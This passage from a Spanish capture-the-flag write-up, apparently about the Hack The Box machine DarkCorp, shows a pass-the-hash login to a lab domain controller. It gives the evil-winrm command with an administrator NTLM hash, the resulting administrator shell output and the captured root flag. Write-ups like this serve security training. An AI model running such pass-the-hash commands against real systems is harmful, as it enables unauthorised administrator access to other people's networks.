Ahora utilizando este mismo `hash` vamos a conectarnos por `WinRM` a la maquina victima realizando un `Pass-The-Hash` de esta forma:

```shell
proxychains evil-winrm -i dc-01.darkcorp.htb -u "administrator" -H "fcb3ca5a19a1ccf2d14c13e8b64cde0f"
```

Info:

```
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc-01.darkcorp.htb:5985  ...  OK
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
darkcorp\administrator
```

Veremos que ha funcionado, por lo que leeremos la `flag` del `admin`.

> root.txt

```
5fa057c15fa5f6586503d29a5b967800
```
